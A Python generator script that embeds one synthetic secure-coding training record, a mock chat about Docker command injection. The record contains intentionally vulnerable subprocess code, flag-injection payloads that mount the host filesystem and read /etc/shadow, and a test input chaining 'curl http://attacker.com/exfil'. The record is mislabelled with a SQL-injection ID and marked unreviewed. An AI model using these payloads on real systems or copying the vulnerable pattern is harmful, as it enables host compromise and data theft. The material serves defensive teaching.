#!/usr/bin/env python3
"""
Add remaining 4 examples to batch_007_corrections.py
This script generates the complete function definitions for examples 031-034
"""

# Example 031: Docker container escape (Python)
example_031 = '''
def create_example_031():
    """Docker container escape - Python (FIXED: Balanced braces in sets/dicts)"""
    return {
        "id": "sql-injection-000031",
        "metadata": {
            "lang": "python",
            "category": "injection",
            "subcategory": "command_injection",
            "technique": "container_escape_command_injection",
            "owasp_2021": "A03:2021-Injection",
            "cwe": "CWE-78",
            "severity": "CRITICAL",
            "complexity": "advanced",
            "created": "2025-11-30",
            "validated": False
        },
        "context": {
            "real_world_incident": "A container escape vulnerability in Docker (CVE-2019-5736) allowed attackers to escape containers and gain root access on the host system.",
            "impact": "Researchers demonstrated how command injection in containerized applications could be chained with container runtime vulnerabilities to achieve full host compromise. This affected thousands of organizations using Docker in production.",
            "attack_vector": "The technique combined path traversal, symbolic link exploitation, and command injection to overwrite the container runtime binary (runc), achieving persistence and privilege escalation.",
            "cve": "CVE-2019-5736",
            "year": 2019
        },
        "conversations": [
            {
                "turn": 1,
                "from": "human",
                "value": "I'm building a Docker container management API in Python. How do I safely execute docker commands with user-provided container names?"
            },
            {
                "turn": 2,
                "from": "assistant",
                "value": """I'll show you how container command injection can lead to escape, and then the secure approach using the Docker SDK.

**VULNERABLE CODE - DO NOT USE:**

```python
import subprocess

def execute_in_container(container_name, command):
    # DANGER: Passes user input directly to docker exec
    full_command = f"docker exec {container_name} {command}"
    result = subprocess.run(
        full_command,
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout
```

**Why This Is Dangerous:**

Attackers can inject Docker flags to escape container isolation or access the host system.

**Attack Payload:**
```python
# Attack 1: Mount host filesystem
container_name = "webapp --privileged -v /:/host"
command = "cat /host/etc/shadow"

execute_in_container(container_name, command)

# Attack 2: Escape to host namespace
container_name = "webapp --pid=host --net=host --ipc=host"
command = "ps aux"  # See all host processes

execute_in_container(container_name, command)
```

**Result:** Full host filesystem access and namespace escape.

**SECURE IMPLEMENTATION:**

```python
import docker
import re
from typing import Optional, Dict, Any, List

class SecureContainerManager:
    \"\"\"Secure Docker container management using Docker SDK.\"\"\"

    # Container name/ID pattern: alphanumeric and underscore only
    CONTAINER_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')

    # Allowed commands (allowlist approach)
    ALLOWED_COMMANDS = {
        'ls': ['-la', '-lh'],
        'cat': [],
        'tail': ['-n', '-f'],
        'head': ['-n'],
        'ps': ['aux', '-ef'],
        'df': ['-h'],
    }

    def __init__(self):
        try:
            self.client = docker.from_env()
        except docker.errors.DockerException as e:
            raise RuntimeError(f"Failed to connect to Docker: {e}")

    def validate_container_id(self, container_id: str) -> str:
        \"\"\"
        Validate container ID or name.

        Security checks:
        1. Format validation (alphanumeric, dash, underscore)
        2. Container must exist
        3. Container must be running
        4. Return full container ID (64-char hex)
        \"\"\"
        if not container_id or not isinstance(container_id, str):
            raise ValueError("Container ID cannot be empty")

        # Check format
        if not self.CONTAINER_PATTERN.match(container_id):
            raise ValueError(
                "Invalid container ID format. "
                "Must be alphanumeric, dash, or underscore only"
            )

        try:
            # Get container object
            container = self.client.containers.get(container_id)

            # Verify container is running
            container.reload()
            if container.status != 'running':
                raise ValueError(f"Container is not running: {container.status}")

            # Return full container ID (64-char hex)
            return container.id

        except docker.errors.NotFound:
            raise ValueError(f"Container not found: {container_id}")
        except docker.errors.APIError as e:
            raise RuntimeError(f"Docker API error: {e}")

    def validate_command(self, cmd: str, args: List[str]) -> tuple:
        \"\"\"
        Validate command against allowlist.

        Returns: (cmd, validated_args)
        \"\"\"
        if cmd not in self.ALLOWED_COMMANDS:
            raise ValueError(f"Command not in allowlist: {cmd}")

        allowed_args = self.ALLOWED_COMMANDS[cmd]
        validated_args = []

        for arg in args:
            # Arguments must be in allowlist OR be safe file paths
            if arg in allowed_args:
                validated_args.append(arg)
            elif self.is_safe_path(arg):
                validated_args.append(arg)
            else:
                raise ValueError(f"Argument not allowed: {arg}")

        return cmd, validated_args

    def is_safe_path(self, path: str) -> bool:
        \"\"\"Validate path is safe (no command injection metacharacters).\"\"\"
        if not path:
            return False

        # Path must not contain shell metacharacters
        dangerous_chars = {';', '&', '|', '`', '$', '(', ')', '<', '>', '\\n', '\\r'}
        if any(char in path for char in dangerous_chars):
            return False

        # Must match safe path pattern
        path_pattern = re.compile(r'^[a-zA-Z0-9/._-]{1,256}$')
        return bool(path_pattern.match(path))

    def exec_in_container(
        self,
        container_id: str,
        cmd: str,
        args: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        \"\"\"
        Execute command in container using Docker SDK.

        Security controls:
        1. Container ID validation
        2. Command allowlist
        3. Argument validation
        4. SDK execution (no shell)
        5. Output size limits
        \"\"\"
        args = args or []

        try:
            # Validate container
            valid_container_id = self.validate_container_id(container_id)

            # Validate command
            valid_cmd, valid_args = self.validate_command(cmd, args)

            # Build full command
            full_command = [valid_cmd] + valid_args

            # Get container
            container = self.client.containers.get(valid_container_id)

            # Execute command using SDK (no shell)
            exit_code, output = container.exec_run(
                cmd=full_command,
                stdout=True,
                stderr=True,
                stdin=False,
                tty=False,
                privileged=False,  # CRITICAL: Never privileged
                user='',           # Use container's default user
                environment={}     # No environment variables
            )

            # Limit output size to prevent memory exhaustion
            output_str = output.decode('utf-8', errors='replace')
            if len(output_str) > 100000:  # 100KB limit
                output_str = output_str[:100000] + "\\n[Output truncated]"

            return {
                "success": exit_code == 0,
                "exit_code": exit_code,
                "output": output_str
            }

        except ValueError as e:
            return {
                "success": False,
                "error": f"Validation error: {e}"
            }
        except docker.errors.APIError as e:
            return {
                "success": False,
                "error": "Container execution failed"
            }


# Usage
manager = SecureContainerManager()

# Safe execution
result = manager.exec_in_container(
    container_id="webapp",
    cmd="ls",
    args=["-la", "/var/www"]
)

if result["success"]:
    print(result["output"])
else:
    print(f"Error: {result['error']}")

# Attack attempts blocked
try:
    # Attack 1: Malicious container name with flags
    result = manager.exec_in_container(
        container_id="webapp --privileged",
        cmd="ls"
    )
except ValueError as e:
    print(f"Attack blocked: {e}")

try:
    # Attack 2: Command injection in arguments
    result = manager.exec_in_container(
        container_id="webapp",
        cmd="cat",
        args=["/etc/passwd; curl http://attacker.com/exfil"]
    )
except ValueError as e:
    print(f"Attack blocked: {e}")
```

**Key Security Controls:**

1. **Docker SDK**: Use official SDK instead of shell commands
2. **Container ID Validation**: Alphanumeric only, must exist and be running
3. **Command Allowlist**: Only pre-approved commands
4. **Argument Validation**: Each argument validated
5. **No Privileged Mode**: privileged=False always
6. **Output Limiting**: Prevent memory exhaustion"""
            },
            {
                "turn": 3,
                "from": "human",
                "value": "What about managing container lifecycle operations like start/stop/restart securely?"
            },
            {
                "turn": 4,
                "from": "assistant",
                "value": """For lifecycle operations, use the Docker SDK with proper validation and access controls:

```python
import docker
import re
from typing import Dict, Any, List
from enum import Enum

class ContainerAction(Enum):
    START = "start"
    STOP = "stop"
    RESTART = "restart"
    PAUSE = "pause"
    UNPAUSE = "unpause"

class SecureLifecycleManager:
    \"\"\"Secure container lifecycle management.\"\"\"

    CONTAINER_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')

    def __init__(self):
        try:
            self.client = docker.from_env()
        except docker.errors.DockerException as e:
            raise RuntimeError(f"Failed to connect to Docker: {e}")

    def perform_action(
        self,
        container_id: str,
        action: ContainerAction,
        timeout: int = 10
    ) -> Dict[str, Any]:
        \"\"\"
        Perform lifecycle action on container.

        Security controls:
        1. Container ID validation
        2. Action allowlist (enum)
        3. Timeout enforcement
        4. Error handling
        \"\"\"
        # Validate container ID
        if not self.CONTAINER_PATTERN.match(container_id):
            raise ValueError("Invalid container ID format")

        # Validate timeout
        if timeout < 1 or timeout > 300:
            raise ValueError("Timeout must be between 1-300 seconds")

        try:
            container = self.client.containers.get(container_id)

            # Perform action based on enum
            if action == ContainerAction.START:
                container.start()
            elif action == ContainerAction.STOP:
                container.stop(timeout=timeout)
            elif action == ContainerAction.RESTART:
                container.restart(timeout=timeout)
            elif action == ContainerAction.PAUSE:
                container.pause()
            elif action == ContainerAction.UNPAUSE:
                container.unpause()

            return {
                "success": True,
                "action": action.value,
                "container": container.short_id
            }

        except docker.errors.NotFound:
            return {"success": False, "error": "Container not found"}
        except docker.errors.APIError as e:
            return {"success": False, "error": f"Action failed: {action.value}"}


# Usage
manager = SecureLifecycleManager()

# Safe operations
result = manager.perform_action("webapp", ContainerAction.RESTART, timeout=30)
print(f"Result: {result}")

# Type-safe actions prevent injection
result = manager.perform_action("webapp", ContainerAction.STOP)
print(f"Stopped: {result['success']}")
```

**Key Security Features:**

1. **Enum-Based Actions**: Type-safe action definitions prevent injection
2. **Timeout Validation**: Prevent resource exhaustion
3. **SDK Methods**: Direct API calls, no shell execution
4. **Consistent Error Handling**: Don't leak internal details"""
            }
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": "2025-11-30",
            "issues": []
        }
    }
'''

print("Generated example 031 definition")
print(f"Length: {len(example_031)} characters")
